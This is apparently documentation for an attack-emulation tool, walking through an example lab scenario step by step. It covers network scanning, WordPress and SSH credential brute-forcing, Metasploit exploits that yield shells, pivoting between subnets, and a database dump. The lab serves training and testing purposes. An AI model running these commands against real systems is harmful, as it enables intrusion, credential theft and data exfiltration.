On this page we will go through the Steps of the example attack scenario.

## Scenario execution
First, enter the container with Cryton CLI:
```shell
docker exec -it cryton-cli bash
```

### Autorun the scenario
```shell
/opt/resources/run_scenario_1.sh
```

### Manually run the scenario

Register and check the Worker:
```shell
cryton-cli workers create attacker
cryton-cli workers health-check <worker-id>
```

Validate the template:
```shell
cryton-cli plans validate /opt/resources/template.yml -i /opt/resources/inventory.yml
```

Upload the template, create a Plan and a Run:
```shell
cryton-cli plan-templates create /opt/resources/template.yml
cryton-cli plans create <plan-template-id> -i /opt/resources/inventory.yml
cryton-cli runs create <plan-id> <worker-id>
```

Execute the Run:
```shell
cryton-cli runs execute <run-id>
```

Check status of the Run:
```shell
cryton-cli runs show <run-id>
```

Generate Run report:
```shell
cryton-cli runs report <run-id>
```

---

## Plan description
Here is a bit more detailed description of the plan. It gives you the commands to recreate the Run yourself.

### Stage 1a - DMZ information gathering

#### Scan DMZ
```shell
nmap -sV 192.168.91.0/24 -p80,3306 --exclude 192.168.91.11 -sV --open
```

#### Scan WordPress website
```shell
wpscan 192.168.91.10
```

### Stage 1b - WordPress exploitation

#### Get WordPress credentials using bruteforce
```shell
nmap --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.91.10
```

#### Get session using exploit
(MSF console)
```shell
use unix/webapp/wp_admin_shell_upload
set rhosts 192.168.91.10
set username wordpress
set password wordpress
set LHOST 192.168.91.30
exploit -j
```

### Stage 2a - Server network information gathering

#### Check for interfaces
```shell
cat /etc/hosts
```

#### Create routing table
(MSF console)
```shell
use post/multi/manage/autoroute
set cmd add
set session 1
set SUBNET 192.168.92.0
run
```

check the routing table
```shell
route print
```

cleaning the routing table
```shell
route flush
```

#### Scan FTP server
(MSF console)
```shell
use scanner/portscan/tcp
set PORTS 21
set RHOSTS 192.168.92.20
run
```

#### Scan DB server
(MSF console)
```shell
use scanner/portscan/tcp
set PORTS 5432
set RHOSTS 192.168.92.21
run
```

### Stage 2b - FTP exploitation

#### Exploit FTP server
(MSF console)
```shell
use unix/ftp/vsftpd_234_backdoor
set payload cmd/unix/interact
set RHOSTS 192.168.92.20
exploit
```

#### Read logs from the FTP server
```shell
cat /var/log/vsftpd.log
```

### Stage 3a - User network information gathering

#### Create routing table
(MSF console)
```shell
use post/multi/manage/autoroute
set cmd add
set session 1
set SUBNET 192.168.94.0
run
```

#### Scan user machine
(MSF console)
```shell
use scanner/portscan/tcp
set PORTS 22
set RHOSTS 192.168.94.20
run
```

### Stage 3b - User exploitation

#### Bruteforce user credentials
(MSF console)
```shell
use scanner/ssh/ssh_login
set RHOSTS 192.168.94.20
set USERNAME victim
set PASS_FILE /app/resources/pass_list.txt
set STOP_ON_SUCCESS true
set BLANK_PASSWORDS true
set THREADS 5
run
```

### Stage 4a - data extraction

#### Check user's bash history
```shell
cat ~/.bash_history
```

#### Dump database
````shell
PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb
````

[//]: # (#### Create Socks proxy &#40;deprecated for now&#41;)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use auxiliary/server/socks_proxy)

[//]: # (set VERSION 4a)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan server network &#40;deprecated for now&#41;)

[//]: # (```shell)

[//]: # (nmap 192.168.62.20 -sT -Pn --proxies socks4://127.0.0.1:1080 -p21 -sV)

[//]: # (```)